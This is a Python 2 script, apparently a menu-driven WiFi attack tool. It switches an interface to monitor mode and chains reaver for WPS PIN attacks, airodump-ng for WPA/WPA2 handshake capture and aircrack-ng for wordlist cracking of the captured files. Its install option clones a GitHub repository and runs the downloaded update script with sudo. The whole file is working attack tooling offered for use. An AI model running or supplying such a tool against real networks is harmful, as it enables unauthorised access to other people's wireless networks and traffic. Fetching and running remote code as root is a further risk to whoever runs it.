import os
import sys
import time
import subprocess
from os import system
from time import sleep


logo = """\033[93m\033[91m}--{+} 
  .--.    .--.  ,---.,-. 
 / /\ \  / /\ \ | .-'|(| 
/ /__\ \/ /__\ \| `-.(_) 
|  __  ||  __  || .-'| | 
| |  |)|| |  |)|| |  | | 
|_|  (_)|_|  (_))\|  `-' 
               (__)     
			 {+}--{\033[0m\033[93m\033[0m                                
       
	"""

menu = """\033[97m
=======================
[1] - WPS ATTACK
[2] - WPA/WPA2 ATTACK
[3] - CAP BRUTEFORCE
[0] - INSTALL & UPDATE
[99] - EXIT
=======================
"""


if not os.geteuid() == 0:
  sys.exit("""\033[1;91m\n[!] Must be run as root. [!]\n\033[1;m""")

os.system("clear && clear")
print logo  
print menu 
def quit():
            con = raw_input('Continue [Y/n] -> ')
            if con[0].upper() == 'N':
                exit()
            else:
                os.system("clear")
                print logo
                print menu
                select()   

def  select():
  try:
    choice = input("\033[92mAaFi~# \033[0m")
    if choice == 1:
	  os.system("airmon-ng")
	  interface = raw_input("Enter your Interface : ")
	  inter = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(interface)
	  system(inter)
	  wash = 'wash -i {0}'.format(interface)
	  print "\033[1mCtrl + C To Stop \033[0m"
	  system(wash)
	  print (" ")
	  bssid = raw_input("BSSID: ")
	  print "\033[1mWPS ATTACK will start now\033[0m"
	  sleep(5)
	  reaver = 'reaver -i {0} -b {1} '.format(interface, bssid)
	  system(reaver)
    elif choice == 2:
		os.system("airmon-ng")
		interface = raw_input("Enter your Interface : ")
		inter = 'ifconfig {0} down && iwconfig {0} mode monitor && ifconfig {0} up'.format(interface)
		system(inter)
		dump = 'airodump-ng {0}'.format(interface)
		print "\033[1mCtrl + C To Stop \033[0m"
		sleep(3)
		system(dump)
		print (" ")
		bssid = raw_input("BSSID: ")
		ch = raw_input("Channel : ")
		sv = raw_input("File Name : ")
		airo = 'airodump-ng -c {0} --bssid {1} -w {2} {3}'.format(ch, bssid, sv, interface)
		system(airo)
    elif choice == 99:
		exit
    elif choice == 0:
		os.system("clear")
		print("This tool is only available for Linux and similar systems  ")
		os.system("git clone https://github.com/Manisso/wifisky.git")
		os.system("cd wifisky && sudo bash ./update.sh")
		os.system("wifisky")	
    elif choice == 3:
		wordlist = raw_input("wordlist : ")
		save2 = raw_input("Enter the CAP file name : ")
		crack = 'aircrack-ng {0} -w {1} '.format(save2, wordlist)
		system(crack)
		time.sleep(999)
  except(KeyboardInterrupt):
    print ""
select()
